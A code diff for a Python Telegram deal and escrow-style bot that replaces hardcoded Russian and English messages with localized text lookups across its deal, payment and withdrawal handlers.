+        [premium_button(get_text(lang, "all_deals_title"), "all_deals", "🏆")],
+        [premium_button(get_text(lang, "withdraw_funds"), "withdraw_requests", "💲")],
         [premium_button(get_text(lang, "main_menu"), "back_to_main", "◀️")]
     ])
 
 
-def rekvisits_edit_keyboard():
+def rekvisits_edit_keyboard(user_id: int):
+    lang = get_user_language(user_id)
+    if lang is None:
+        lang = "ru"
     return InlineKeyboardMarkup(inline_keyboard=[
-        [premium_button("ИЗМЕНИТЬ TON", "edit_ton", "💎")],
-        [premium_button("ИЗМЕНИТЬ STARS", "edit_stars", "⭐️")],
-        [premium_button("ИЗМЕНИТЬ RUB", "edit_rub", "💰")],
-        [premium_button("ИЗМЕНИТЬ UAH", "edit_uah", "🌐")],
-        [premium_button("НАЗАД", "back_to_admin", "◀️")]
+        [premium_button("TON", "edit_ton", "💎")],
+        [premium_button("STARS", "edit_stars", "⭐️")],
+        [premium_button("RUB", "edit_rub", "💰")],
+        [premium_button("UAH", "edit_uah", "🌐")],
+        [premium_button(get_text(lang, "main_menu"), "back_to_admin", "◀️")]
     ])
 
 
-def seller_confirm_keyboard(deal_id):
+def seller_confirm_keyboard(deal_id, user_id: int):
+    lang = get_user_language(user_id)
+    if lang is None:
+        lang = "ru"
     return InlineKeyboardMarkup(inline_keyboard=[
-        [premium_button("ПЕРЕДАЛ ТОВАР", f"seller_done_{deal_id}", "📦")]
+        [premium_button(get_text(lang, "product_delivered"), f"seller_done_{deal_id}", "📦")]
     ])
 
 
-def buyer_confirm_keyboard(deal_id):
+def buyer_confirm_keyboard(deal_id, user_id: int):
+    lang = get_user_language(user_id)
+    if lang is None:
+        lang = "ru"
     return InlineKeyboardMarkup(inline_keyboard=[
-        [premium_button("ПОЛУЧИЛ ТОВАР", f"buyer_confirm_{deal_id}", "👍")],
-        [premium_button("В ПОДДЕРЖКУ", f"support_{deal_id}", "❓")]
+        [premium_button(get_text(lang, "confirm_receipt"), f"buyer_confirm_{deal_id}", "👍")],
+        [premium_button(get_text(lang, "contact_support"), f"support_{deal_id}", "❓")]
     ])
 
 
-def buyer_pending_keyboard(deal_id):
+def buyer_pending_keyboard(deal_id, user_id: int):
+    lang = get_user_language(user_id)
+    if lang is None:
+        lang = "ru"
     return InlineKeyboardMarkup(inline_keyboard=[
-        [premium_button("ОЖИДАНИЕ ПЕРЕДАЧИ", "noop", "⏳")],
-        [premium_button("В ПОДДЕРЖКУ", f"support_{deal_id}", "❓")]
+        [premium_button(get_text(lang, "waiting_for_delivery"), "noop", "⏳")],
+        [premium_button(get_text(lang, "contact_support"), f"support_{deal_id}", "❓")]
     ])
 
 
@@ -776,11 +1016,11 @@ def add_balance(user_id: int, currency: str, amount: float):
     save_balance(balance)
 
 
-def get_rekvisits_text(currency, amount):
+def get_rekvisits_text(currency, amount, user_id: int):
     curr_key = currency.lower()
     if curr_key in rekvisits:
         return rekvisits[curr_key].format(amount=amount)
-    return rekvisits.get("stars", "Реквизиты не заданы").format(amount=amount)
+    return f"Payment details: {amount} {currency}"
 
 
 async def safe_edit(callback: types.CallbackQuery, text: str, reply_markup=None, **kwargs):
@@ -790,7 +1030,7 @@ async def safe_edit(callback: types.CallbackQuery, text: str, reply_markup=None,
         else:
             await callback.message.answer(text, reply_markup=reply_markup, **kwargs)
     except Exception as e:
-        print(f"Ошибка при редактировании: {e}")
+        print(f"Error: {e}")
         try:
             await callback.message.answer(text, reply_markup=reply_markup, **kwargs)
         except:
@@ -804,7 +1044,7 @@ async def send_welcome_message(message: types.Message, user_id: int):
     
     welcome_text = f"""{pm('🔥')} {get_text(lang, 'bot_name')} {pm('🔥')}
 
-{pm('🏴‍☠️')} {get_text(lang, 'safe_deals')}
+{pm('🏴‍☠️')} {get_text(lang, 'bot_desc')}
 • {pm('🤝')} {get_text(lang, 'feature1')}
 • {pm('💎')} {get_text(lang, 'feature2')}
 • {pm('🔒')} {get_text(lang, 'feature3')}
@@ -820,7 +1060,7 @@ async def send_welcome_message(message: types.Message, user_id: int):
 {pm('7️⃣')} {get_text(lang, 'step7')}
 
 {pm('📢')} {get_text(lang, 'our_channel')}: {CHANNEL_LINK}
-{pm('🆘')} {get_text(lang, 'support')}: @p2psuptokeeperbot
+{pm('🆘')} {get_text(lang, 'support')}: {get_text(lang, 'support_contact')}
 
 {pm('🔥')} {get_text(lang, 'start_now')} {pm('🚀')}"""
 
@@ -845,27 +1085,30 @@ async def send_language_selection(message: types.Message):
 
 async def send_buyer_pending_message(deal_id: str):
     deal = deals[deal_id]
-    buyer_lang = get_user_language(deal.get("buyer_id", 0))
+    buyer_id = deal.get("buyer_id", 0)
+    buyer_lang = get_user_language(buyer_id)
     if buyer_lang is None:
         buyer_lang = "ru"
-    keyboard = buyer_pending_keyboard(deal_id)
+    keyboard = buyer_pending_keyboard(deal_id, buyer_id)
+
+    text = f"{pm('✈️')} {get_text(buyer_lang, 'deal')} #{deal_id} {get_text(buyer_lang, 'status_paid')}!\n\n" \
+           f"{pm('📦')} {get_text(buyer_lang, 'product')}: {deal['product']}\n" \
+           f"{pm('💰')} {get_text(buyer_lang, 'amount')}: {deal['amount']} {deal['currency']}\n" \
+           f"{pm('👤')} {get_text(buyer_lang, 'seller')}: @{deal['seller_username']}\n\n" \
+           f"{pm('⏳')} {get_text(buyer_lang, 'waiting_for_delivery')}\n\n" \
+           f"{pm('🔥')} {get_text(buyer_lang, 'premium_1')}"
 
     try:
         msg = await bot.send_message(
             deal["buyer_username"],
-            f"{pm('✈️')} {get_text(buyer_lang, 'paid')} #{deal_id}!\n\n"
-            f"{pm('📦')} {get_text(buyer_lang, 'feature1')}: {deal['product']}\n"
-            f"{pm('💰')} {get_text(buyer_lang, 'enter_amount')}: {deal['amount']} {deal['currency']}\n"
-            f"{pm('👤')} {get_text(buyer_lang, 'our_channel')}: @{deal['seller_username']}\n\n"
-            f"{pm('⏳')} {get_text(buyer_lang, 'awaiting_confirmation')}\n\n"
-            f"{pm('🔥')} {get_text(buyer_lang, 'premium_1')}",
+            text,
             reply_markup=keyboard
         )
         deal["buyer_message_id"] = msg.message_id
         deal["buyer_chat_id"] = msg.chat.id
         save_deals(deals)
     except Exception as e:
-        print(f"Ошибка: {e}")
+        print(f"Error: {e}")
 
 
 # ========== ВЫБОР ЯЗЫКА ==========
@@ -879,7 +1122,7 @@ async def select_language_callback(callback: types.CallbackQuery):
 async def set_language_callback(callback: types.CallbackQuery):
     lang_code = callback.data.split("_")[2]
     set_user_language(callback.from_user.id, lang_code)
-    await callback.answer(f"Language set to {LANGUAGES[lang_code]}")
+    await callback.answer(f"{get_text(lang_code, 'welcome')}")
     await send_welcome_message(callback.message, callback.from_user.id)
 
 
@@ -889,7 +1132,7 @@ async def back_to_main(callback: types.CallbackQuery):
     lang = get_user_language(callback.from_user.id)
     if lang is None:
         lang = "ru"
-    text = f"{pm('🔥')} {get_text(lang, 'bot_name')} — {get_text(lang, 'safe_deals')} {pm('🔥')}\n\n{get_text(lang, 'choose_action')}:"
+    text = f"{pm('🔥')} {get_text(lang, 'bot_name')} — {get_text(lang, 'bot_desc')} {pm('🔥')}\n\n{get_text(lang, 'choose_action')}:"
     await safe_edit(callback, text, reply_markup=main_menu_keyboard(callback.from_user.id))
 
 
@@ -947,7 +1190,13 @@ async def menu_my_deals(callback: types.CallbackQuery):
                 "awaiting_confirmation": pm('📦'),
                 "completed": pm('🎁')
             }.get(d['status'], pm('❓'))
-            text += f"{d_id} | {status_emoji} | {d['amount']} {d['currency']}\n   → {d['product'][:30]}\n\n"
+            status_text = {
+                "waiting_payment": get_text(lang, 'status_waiting'),
+                "paid": get_text(lang, 'status_paid'),
+                "awaiting_confirmation": get_text(lang, 'status_awaiting'),
+                "completed": get_text(lang, 'status_completed')
+            }.get(d['status'], '?')
+            text += f"{d_id} | {status_emoji} {status_text} | {d['amount']} {d['currency']}\n   → {d['product'][:30]}\n\n"
         await safe_edit(callback, text, reply_markup=back_to_main_button(callback.from_user.id))
 
 
@@ -966,7 +1215,7 @@ async def menu_premium(callback: types.CallbackQuery):
 
 {pm('⭐️')} {get_text(lang, 'premium_active')}
 
-{pm('🚀')} THANK YOU FOR BEING WITH US!"""
+{pm('🚀')} {get_text(lang, 'thank_you')}"""
     await safe_edit(callback, text, reply_markup=back_to_main_button(callback.from_user.id))
 
 
@@ -1007,23 +1256,22 @@ async def menu_channel(callback: types.CallbackQuery):
         lang = "ru"
     text = f"""{pm('📢')} {get_text(lang, 'our_channel')}
 
-🔥 Subscribe to stay updated:
+{pm('🔥')} {get_text(lang, 'subscribe')}:
 {CHANNEL_LINK}
 
-{pm('💎')} In the channel:
-• News and updates
-• Useful guides
-• Giveaways and bonuses
-• Current exchange rates
+{pm('💎')} {get_text(lang, 'channel_content')}
 
-{pm('🚀')} CLICK THE LINK AND SUBSCRIBE!"""
+{pm('🚀')} {get_text(lang, 'click_subscribe')}"""
     await safe_edit(callback, text, reply_markup=back_to_main_button(callback.from_user.id), disable_web_page_preview=False)
 
 
 @dp.callback_query(lambda c: c.data == "menu_admin_panel")
 async def menu_admin_panel(callback: types.CallbackQuery):
     if not is_admin(callback.from_user.id):
-        await callback.answer(f"{pm('❌')} {get_text('ru', 'access_denied')}", show_alert=True)
+        lang = get_user_language(callback.from_user.id)
+        if lang is None:
+            lang = "ru"
+        await callback.answer(f"{pm('❌')} {get_text(lang, 'access_denied')}", show_alert=True)
         return
     lang = get_user_language(callback.from_user.id)
     if lang is None:
@@ -1037,15 +1285,17 @@ async def menu_admin_panel(callback: types.CallbackQuery):
 async def cmd_start(message: types.Message):
     # Проверяем, есть ли у пользователя выбранный язык
     if not has_language(message.from_user.id):
-        # Если язык не выбран - показываем выбор языка
         await send_language_selection(message)
         return
     
     # Обработка сделки по ссылке
     if message.text and message.text.startswith("/start deal_"):
         deal_id = message.text.split("_")[1]
+        lang = get_user_language(message.from_user.id)
+        if lang is None:
+            lang = "ru"
+            
         if deal_id not in deals:
-            lang = get_user_language(message.from_user.id) or "ru"
             await message.answer(f"{pm('❌')} {get_text(lang, 'deal_not_found')}")
             return
 
@@ -1054,26 +1304,25 @@ async def cmd_start(message: types.Message):
         save_deals(deals)
 
         if message.from_user.username != deal["buyer_username"]:
-            lang = get_user_language(message.from_user.id) or "ru"
             await message.answer(
-                f"{pm('❌')} {get_text(lang, 'access_denied')}!\n\nThis deal is for @{deal['buyer_username']}\n\nContact support: @dealtonkeeper_bot"
+                f"{pm('❌')} {get_text(lang, 'access_denied')}!\n\n{get_text(lang, 'deal')} #{deal_id} {get_text(lang, 'for_user')} @{deal['buyer_username']}\n\n{get_text(lang, 'support_contact')}: @dealtonkeeper_bot"
             )
             await log_to_master(
                 f"⚠️ UNAUTHORIZED ACCESS\nDeal: #{deal_id}\nAttempted by: @{message.from_user.username}\nExpected: @{deal['buyer_username']}")
             return
 
         if deal["status"] != "waiting_payment":
-            lang = get_user_language(message.from_user.id) or "ru"
-            await message.answer(f"{pm('❌')} Deal already in status: {deal['status']}")
+            await message.answer(f"{pm('❌')} {get_text(lang, 'deal_not_found')}")
             return
 
-        buyer_lang = get_user_language(message.from_user.id) or "ru"
+        text = f"{pm('✈️')} {get_text(lang, 'deal')} #{deal_id}\n\n" \
+               f"{pm('📦')} {get_text(lang, 'product')}: {deal['product']}\n" \
+               f"{pm('💰')} {get_text(lang, 'amount')}: {deal['amount']} {deal['currency']}\n" \
+               f"{pm('👤')} {get_text(lang, 'seller')}: @{deal['seller_username']}\n\n" \
+               f"{pm('⬇️')} {get_text(lang, 'choose_payment_method')} {pm('⬇️')}"
+        
         await message.answer(
-            f"{pm('✈️')} DEAL #{deal_id}\n\n"
-            f"{pm('📦')} {get_text(buyer_lang, 'feature1')}: {deal['product']}\n"
-            f"{pm('💰')} {get_text(buyer_lang, 'enter_amount')}: {deal['amount']} {deal['currency']}\n"
-            f"{pm('👤')} {get_text(buyer_lang, 'our_channel')}: @{deal['seller_username']}\n\n"
-            f"{pm('⬇️')} {get_text(buyer_lang, 'choose_payment_method')} {pm('⬇️')}",
+            text,
             reply_markup=payment_method_keyboard(deal_id, message.from_user.id)
         )
 
@@ -1084,7 +1333,6 @@ async def cmd_start(message: types.Message):
         )
         return
 
-    # Если язык выбран - показываем приветственное меню
     await send_welcome_message(message, message.from_user.id)
 
 
@@ -1116,15 +1364,15 @@ async def withdraw_currency(callback: types.CallbackQuery, state: FSMContext):
     curr_key = currency.lower()
 
     if user_balance.get(curr_key, 0) <= 0:
-        await callback.answer(f"{pm('❌')} No funds in {currency}", show_alert=True)
+        await callback.answer(f"{pm('❌')} {get_text(lang, 'insufficient_balance')}", show_alert=True)
         return
 
     await state.update_data(withdraw_currency=currency, withdraw_amount=user_balance[curr_key])
 
     if currency == "STARS":
-        text = f"{pm('⭐️')} Enter your Telegram username to receive Stars:\n\nEXAMPLE: @john_doe"
+        text = f"{pm('⭐️')} {get_text(lang, 'enter_withdraw_username')}:"
     else:
-        text = f"{pm('💲')} Enter details for {currency} withdrawal:\n\nEXAMPLE for TON: UQ...\nEXAMPLE for RUB/UAH: Card number or wallet"
+        text = f"{pm('💲')} {get_text(lang, 'enter_withdraw_details')} {currency}:"
 
     await safe_edit(callback, text)
     await state.set_state(WithdrawStates.waiting_for_details)
@@ -1155,18 +1403,20 @@ async def withdraw_details(message: types.Message, state: FSMContext):
 
     await bot.send_message(
         MASTER_ADMIN_ID,
-        f"{pm('💲')} NEW WITHDRAWAL REQUEST #{request_id}\n\n"
+        f"💲 NEW WITHDRAWAL REQUEST #{request_id}\n\n"
         f"👤 User: {message.from_user.full_name} (@{message.from_user.username})\n"
-        f"{pm('💰')} Amount: {amount} {currency}\n"
-        f"{pm('📝')} Details: {details}\n\n"
+        f"💰 Amount: {amount} {currency}\n"
+        f"📝 Details: {details}\n\n"
         f"TO CONFIRM: /confirm_withdraw {request_id}"
     )
 
+    text = f"{pm('✅')} {get_text(lang, 'withdraw_request_created')} #{request_id}!\n\n" \
+           f"{pm('💰')} {get_text(lang, 'amount')}: {amount} {currency}\n" \
+           f"{pm('⏳')} {get_text(lang, 'withdraw_pending')}.\n\n" \
+           f"{get_text(lang, 'check_status')}: /withdraw_status {request_id}"
+    
     await message.answer(
-        f"{pm('✅')} WITHDRAWAL REQUEST #{request_id} CREATED!\n\n"
-        f"{pm('💰')} Amount: {amount} {currency}\n"
-        f"{pm('⏳')} Please wait 1-5 minutes for processing.\n\n"
-        f"Check status: /withdraw_status {request_id}",
+        text,
         reply_markup=back_to_main_button(message.from_user.id)
     )
 
@@ -1176,23 +1426,27 @@ async def withdraw_details(message: types.Message, state: FSMContext):
 
 @dp.message(Command("confirm_withdraw"))
 async def confirm_withdraw(message: types.Message):
+    lang = get_user_language(message.from_user.id)
+    if lang is None:
+        lang = "ru"
+        
     if not is_admin(message.from_user.id):
-        await message.answer(f"{pm('❌')} INSUFFICIENT RIGHTS")
+        await message.answer(f"{pm('❌')} {get_text(lang, 'admin_rights')}")
         return
 
     args = message.text.split()
     if len(args) != 2:
-        await message.answer(f"{pm('❗️')} USAGE: /confirm_withdraw [REQUEST ID]")
+        await message.answer(f"{pm('❗️')} {get_text(lang, 'cmd_usage')}: /confirm_withdraw [ID]")
         return
 
     request_id = args[1]
     if request_id not in withdraw_requests:
-        await message.answer(f"{pm('❌')} REQUEST {request_id} NOT FOUND")
+        await message.answer(f"{pm('❌')} {get_text(lang, 'request_not_found')}")
         return
 
     req = withdraw_requests[request_id]
     if req["status"] != "pending":
-        await message.answer(f"{pm('❌')} REQUEST ALREADY PROCESSED: {req['status']}")
+        await message.answer(f"{pm('❌')} {get_text(lang, 'request_already_processed')}: {req['status']}")
         return
 
     req["status"] = "completed"
@@ -1206,44 +1460,51 @@ async def confirm_withdraw(message: types.Message):
         user_balance[curr_key] -= req["amount"]
         save_balance(balance)
 
+    user_lang = get_user_language(req["user_id"])
+    if user_lang is None:
+        user_lang = "ru"
+        
     try:
         await bot.send_message(
             req["user_id"],
-            f"{pm('✅')} WITHDRAWAL CONFIRMED!\n\n"
-            f"{pm('💰')} Amount: {req['amount']} {req['currency']}\n"
-            f"{pm('📝')} Details: {req['details']}\n\n"
-            f"Funds will be sent within 1-5 minutes."
+            f"{pm('✅')} {get_text(user_lang, 'withdraw_completed')}!\n\n"
+            f"{pm('💰')} {get_text(user_lang, 'amount')}: {req['amount']} {req['currency']}\n"
+            f"{pm('📝')} {get_text(user_lang, 'payment_details')}: {req['details']}"
         )
     except:
         pass
 
-    await message.answer(f"{pm('✅')} WITHDRAWAL #{request_id} CONFIRMED! FUNDS DEDUCTED.")
+    await message.answer(f"{pm('✅')} {get_text(lang, 'withdraw_completed')} #{request_id}! {get_text(lang, 'funds_deducted')}")
     await log_to_master(f"✅ Withdrawal #{request_id} confirmed by admin @{message.from_user.username}")
 
 
 @dp.message(Command("withdraw_status"))
 async def withdraw_status(message: types.Message):
+    lang = get_user_language(message.from_user.id)
+    if lang is None:
+        lang = "ru"
+        
     args = message.text.split()
     if len(args) != 2:
-        await message.answer(f"{pm('❗️')} USAGE: /withdraw_status [REQUEST ID]")
+        await message.answer(f"{pm('❗️')} {get_text(lang, 'cmd_usage')}: /withdraw_status [ID]")
         return
 
     request_id = args[1]
     if request_id not in withdraw_requests:
-        await message.answer(f"{pm('❌')} REQUEST {request_id} NOT FOUND")
+        await message.answer(f"{pm('❌')} {get_text(lang, 'request_not_found')}")
         return
 
     req = withdraw_requests[request_id]
     status_text = {
-        "pending": f"{pm('⏳')} PENDING",
-        "completed": f"{pm('✅')} COMPLETED"
+        "pending": f"{pm('⏳')} {get_text(lang, 'status_waiting')}",
+        "completed": f"{pm('✅')} {get_text(lang, 'status_completed')}"
     }.get(req["status"], req["status"])
 
     await message.answer(
-        f"{pm('📊')} WITHDRAWAL STATUS #{request_id}\n\n"
-        f"{pm('💰')} Amount: {req['amount']} {req['currency']}\n"
-        f"📅 Created: {req['created_at'][:19]}\n"
-        f"📊 Status: {status_text}"
+        f"{pm('📊')} {get_text(lang, 'withdraw_funds')} #{request_id}\n\n"
+        f"{pm('💰')} {get_text(lang, 'amount')}: {req['amount']} {req['currency']}\n"
+        f"📅 {get_text(lang, 'created')}: {req['created_at'][:19]}\n"
+        f"📊 {get_text(lang, 'status')}: {status_text}"
     )
 
 
@@ -1265,7 +1526,7 @@ async def get_currency(callback: types.CallbackQuery, state: FSMContext):
         lang = "ru"
     currency = callback.data.split("_")[1]
     await state.update_data(currency=currency)
-    text = f"{pm('💰')} {get_text(lang, 'enter_amount')}:\nCURRENCY: {currency}"
+    text = f"{pm('💰')} {get_text(lang, 'enter_amount')}:\n{get_text(lang, 'currency')}: {currency}"
     await safe_edit(callback, text)
     await state.set_state(DealStates.waiting_for_amount)
 
@@ -1280,8 +1541,8 @@ async def get_amount(message: types.Message, state: FSMContext):
         if amount <= 0:
             raise ValueError
         await state.update_data(amount=amount)
-        await message.answer(
-            f"{pm('👤')} {get_text(lang, 'enter_buyer')}:\n\n{get_text(lang, 'buyer_username_example')}\n\n{pm('❗️')} {get_text(lang, 'only_this_user')}")
+        text = f"{pm('👤')} {get_text(lang, 'enter_buyer')}:\n\n{get_text(lang, 'buyer_username_example')}\n\n{pm('❗️')} {get_text(lang, 'only_this_user')}"
+        await message.answer(text)
         await state.set_state(DealStates.waiting_for_buyer_username)
     except:
         await message.answer(f"{pm('❌')} {get_text(lang, 'invalid_amount')}")
@@ -1316,14 +1577,16 @@ async def get_buyer(message: types.Message, state: FSMContext):
 
     deal_link = f"https://t.me/{BOT_USERNAME}?start=deal_{deal_id}"
 
+    text = f"{pm('✅')} {get_text(lang, 'deal_created')} #{deal_id}!\n\n" \
+           f"{pm('💰')} {get_text(lang, 'amount')}: {data['amount']} {data['currency']}\n" \
+           f"{pm('📦')} {get_text(lang, 'product')}: {data['product']}\n" \
+           f"{pm('👤')} {get_text(lang, 'buyer')}: @{buyer_username}\n\n" \
+           f"{pm('🔗')} {get_text(lang, 'send_link_to_buyer')}:\n\n" \
+           f"{deal_link}\n\n" \
+           f"{pm('🔥')} {get_text(lang, 'after_payment_notify')}"
+    
     await message.answer(
-        f"{pm('✅')} {get_text(lang, 'deal_created')} #{deal_id}!\n\n"
-        f"{pm('💰')} {get_text(lang, 'enter_amount')}: {data['amount']} {data['currency']}\n"
-        f"{pm('📦')} {get_text(lang, 'feature1')}: {data['product']}\n"
-        f"{pm('👤')} {get_text(lang, 'our_channel')}: @{buyer_username}\n\n"
-        f"{pm('🔗')} {get_text(lang, 'send_link_to_buyer')}:\n\n"
-        f"{deal_link}\n\n"
-        f"{pm('🔥')} {get_text(lang, 'premium_1')}",
+        text,
         reply_markup=back_to_main_button(message.from_user.id)
     )
 
@@ -1342,50 +1605,54 @@ async def get_buyer(message: types.Message, state: FSMContext):
 @dp.callback_query(lambda c: c.data.startswith("pay_rekvisits_"))
 async def pay_by_rekvisits(callback: types.CallbackQuery):
     deal_id = callback.data.split("_")[2]
+    lang = get_user_language(callback.from_user.id)
+    if lang is None:
+        lang = "ru"
+        
     if deal_id not in deals:
-        await callback.answer(f"{pm('❌')} DEAL NOT FOUND")
+        await callback.answer(f"{pm('❌')} {get_text(lang, 'deal_not_found')}")
         return
 
     deal = deals[deal_id]
     if deal["status"] != "waiting_payment":
-        await callback.answer(f"{pm('❌')} DEAL ALREADY IN STATUS {deal['status']}")
+        await callback.answer(f"{pm('❌')} {get_text(lang, 'deal_not_found')}")
         return
 
-    pay_text = get_rekvisits_text(deal["currency"], deal["amount"])
-    lang = get_user_language(callback.from_user.id)
-    if lang is None:
-        lang = "ru"
+    pay_text = get_rekvisits_text(deal["currency"], deal["amount"], callback.from_user.id)
 
-    text = f"{pm('✈️')} DEAL #{deal_id}\n\n" \
-           f"{pm('📦')} {get_text(lang, 'feature1')}: {deal['product']}\n" \
-           f"{pm('💰')} {get_text(lang, 'enter_amount')}: {deal['amount']} {deal['currency']}\n" \
-           f"{pm('👤')} {get_text(lang, 'our_channel')}: @{deal['seller_username']}\n\n" \
-           f"{pm('💳')} PAYMENT DETAILS:\n{pay_text}\n\n" \
-           f"{pm('🔥')} AFTER PAYMENT, ADMIN WILL VERIFY WITH /pay {deal_id} {pm('🔥')}"
+    text = f"{pm('✈️')} {get_text(lang, 'deal')} #{deal_id}\n\n" \
+           f"{pm('📦')} {get_text(lang, 'product')}: {deal['product']}\n" \
+           f"{pm('💰')} {get_text(lang, 'amount')}: {deal['amount']} {deal['currency']}\n" \
+           f"{pm('👤')} {get_text(lang, 'seller')}: @{deal['seller_username']}\n\n" \
+           f"{pm('💳')} {get_text(lang, 'payment_details')}:\n{pay_text}\n\n" \
+           f"{pm('🔥')} {get_text(lang, 'payment_verified')}: /pay {deal_id}"
     await safe_edit(callback, text)
 
 
 @dp.callback_query(lambda c: c.data.startswith("pay_balance_"))
 async def pay_by_balance(callback: types.CallbackQuery):
     deal_id = callback.data.split("_")[2]
+    lang = get_user_language(callback.from_user.id)
+    if lang is None:
+        lang = "ru"
+        
     if deal_id not in deals:
-        await callback.answer(f"{pm('❌')} DEAL NOT FOUND")
+        await callback.answer(f"{pm('❌')} {get_text(lang, 'deal_not_found')}")
         return
 
     deal = deals[deal_id]
     if deal["status"] != "waiting_payment":
-        await callback.answer(f"{pm('❌')} DEAL ALREADY IN STATUS {deal['status']}")
+        await callback.answer(f"{pm('❌')} {get_text(lang, 'deal_not_found')}")
         return
 
     buyer_balance = get_balance(callback.from_user.id)
     curr_key = deal["currency"].lower()
-    lang = get_user_language(callback.from_user.id)
-    if lang is None:
-        lang = "ru"
 
     if buyer_balance.get(curr_key, 0) < deal["amount"]:
         await callback.answer(
-            f"{pm('❌')} {get_text(lang, 'insufficient_balance')}!\nNEEDED: {deal['amount']} {deal['currency']}\nAVAILABLE: {buyer_balance.get(curr_key, 0)}",
+            f"{pm('❌')} {get_text(lang, 'insufficient_balance')}!\n"
+            f"{get_text(lang, 'need')}: {deal['amount']} {deal['currency']}\n"
+            f"{get_text(lang, 'available')}: {buyer_balance.get(curr_key, 0)}",
             show_alert=True)
         return
 
@@ -1397,8 +1664,8 @@ async def pay_by_balance(callback: types.CallbackQuery):
     save_deals(deals)
 
     text = f"{pm('✅')} {get_text(lang, 'payment_confirmed')}!\n\n" \
-           f"DEAL #{deal_id}\n" \
-           f"{pm('💰')} DEDUCTED FROM BALANCE: {deal['amount']} {deal['currency']}\n\n" \
+           f"{get_text(lang, 'deal')} #{deal_id}\n" \
+           f"{pm('💰')} {get_text(lang, 'funds_deducted')}: {deal['amount']} {deal['currency']}\n\n" \
            f"{pm('🔔')} {get_text(lang, 'premium_1')}"
     await safe_edit(callback, text, reply_markup=back_to_main_button(callback.from_user.id))
 
@@ -1407,14 +1674,17 @@ async def pay_by_balance(callback: types.CallbackQuery):
     seller_lang = get_user_language(deal["seller_id"])
     if seller_lang is None:
         seller_lang = "ru"
+        
+    text = f"{pm('💎')} {get_text(seller_lang, 'deal')} #{deal_id} {get_text(seller_lang, 'status_paid')}! {pm('💎')}\n\n" \
+           f"{pm('💰')} {get_text(seller_lang, 'amount')}: {deal['amount']} {deal['currency']}\n" \
+           f"{pm('📦')} {get_text(seller_lang, 'product')}: {deal['product']}\n" \
+           f"{pm('👤')} {get_text(seller_lang, 'buyer')}: @{deal['buyer_username']}\n\n" \
+           f"{pm('⬇️')} {get_text(seller_lang, 'seller_delivered')} {pm('⬇️')}"
+    
     await bot.send_message(
         deal["seller_id"],
-        f"{pm('💎')} DEAL #{deal_id} {get_text(seller_lang, 'paid')}! {pm('💎')}\n\n"
-        f"{pm('💰')} {get_text(seller_lang, 'enter_amount')}: {deal['amount']} {deal['currency']}\n"
-        f"{pm('📦')} {get_text(seller_lang, 'feature1')}: {deal['product']}\n"
-        f"{pm('👤')} {get_text(seller_lang, 'our_channel')}: @{deal['buyer_username']}\n\n"
-        f"{pm('⬇️')} {get_text(seller_lang, 'step5')} {pm('⬇️')}",
-        reply_markup=seller_confirm_keyboard(deal_id)
+        text,
+        reply_markup=seller_confirm_keyboard(deal_id, deal["seller_id"])
     )
 
     await log_to_master(f"💰 Deal #{deal_id} paid from balance by @{callback.from_user.username}")
@@ -1422,44 +1692,51 @@ async def pay_by_balance(callback: types.CallbackQuery):
 
 @dp.message(Command("pay"))
 async def pay_command(message: types.Message):
+    lang = get_user_language(message.from_user.id)
+    if lang is None:
+        lang = "ru"
+        
     if not is_admin(message.from_user.id):
-        await message.answer(f"{pm('❌')} INSUFFICIENT RIGHTS")
+        await message.answer(f"{pm('❌')} {get_text(lang, 'admin_rights')}")
         return
 
     args = message.text.split()
     if len(args) != 2:
-        await message.answer(f"{pm('❗️')} USAGE: /pay [DEAL ID]\nEXAMPLE: /pay a3f2b1c4")
+        await message.answer(f"{pm('❗️')} {get_text(lang, 'cmd_usage')}: /pay [ID]\n{get_text(lang, 'example')}: /pay a3f2b1c4")
         return
 
     deal_id = args[1]
     if deal_id not in deals:
-        await message.answer(f"{pm('❌')} DEAL WITH ID {deal_id} NOT FOUND")
+        await message.answer(f"{pm('❌')} {get_text(lang, 'deal_not_found')}")
         return
 
     deal = deals[deal_id]
     if deal["status"] != "waiting_payment":
-        await message.answer(f"{pm('❌')} DEAL ALREADY IN STATUS {deal['status']}")
+        await message.answer(f"{pm('❌')} {get_text(lang, 'deal_not_found')}")
         return
 
     deal["status"] = "paid"
     deal["paid_by_admin"] = message.from_user.id
     save_deals(deals)
 
-    await message.answer(f"{pm('✅')} PAYMENT CONFIRMED FOR DEAL {deal_id}")
+    await message.answer(f"{pm('✅')} {get_text(lang, 'payment_confirmed')} {get_text(lang, 'deal')} {deal_id}")
 
     await send_buyer_pending_message(deal_id)
 
     seller_lang = get_user_language(deal["seller_id"])
     if seller_lang is None:
         seller_lang = "ru"
+        
+    text = f"{pm('💎')} {get_text(seller_lang, 'deal')} #{deal_id} {get_text(seller_lang, 'status_paid')}! {pm('💎')}\n\n" \
+           f"{pm('💰')} {get_text(seller_lang, 'amount')}: {deal['amount']} {deal['currency']}\n" \
+           f"{pm('📦')} {get_text(seller_lang, 'product')}: {deal['product']}\n" \
+           f"{pm('👤')} {get_text(seller_lang, 'buyer')}: @{deal['buyer_username']}\n\n" \
+           f"{pm('⬇️')} {get_text(seller_lang, 'seller_delivered')} {pm('⬇️')}"
+    
     await bot.send_message(
         deal["seller_id"],
-        f"{pm('💎')} DEAL #{deal_id} {get_text(seller_lang, 'paid')}! {pm('💎')}\n\n"
-        f"{pm('💰')} {get_text(seller_lang, 'enter_amount')}: {deal['amount']} {deal['currency']}\n"
-        f"{pm('📦')} {get_text(seller_lang, 'feature1')}: {deal['product']}\n"
-        f"{pm('👤')} {get_text(seller_lang, 'our_channel')}: @{deal['buyer_username']}\n\n"
-        f"{pm('⬇️')} {get_text(seller_lang, 'step5')} {pm('⬇️')}",
-        reply_markup=seller_confirm_keyboard(deal_id)
+        text,
+        reply_markup=seller_confirm_keyboard(deal_id, deal["seller_id"])
     )
 
     await log_to_master(
@@ -1474,29 +1751,30 @@ async def pay_command(message: types.Message):
 @dp.callback_query(lambda c: c.data.startswith("seller_done_"))
 async def seller_delivered(callback: types.CallbackQuery):
     deal_id = callback.data.split("_")[-1]
+    lang = get_user_language(callback.from_user.id)
+    if lang is None:
+        lang = "ru"
+        
     if deal_id not in deals:
-        await callback.answer(f"{pm('❌')} DEAL NOT FOUND")
+        await callback.answer(f"{pm('❌')} {get_text(lang, 'deal_not_found')}")
         return
 
     deal = deals[deal_id]
     if deal["status"] != "paid":
-        await callback.answer(f"{pm('❌')} PAYMENT NOT CONFIRMED YET")
+        await callback.answer(f"{pm('❌')} {get_text(lang, 'status_waiting')}")
         return
 
     deal["status"] = "awaiting_confirmation"
     save_deals(deals)
 
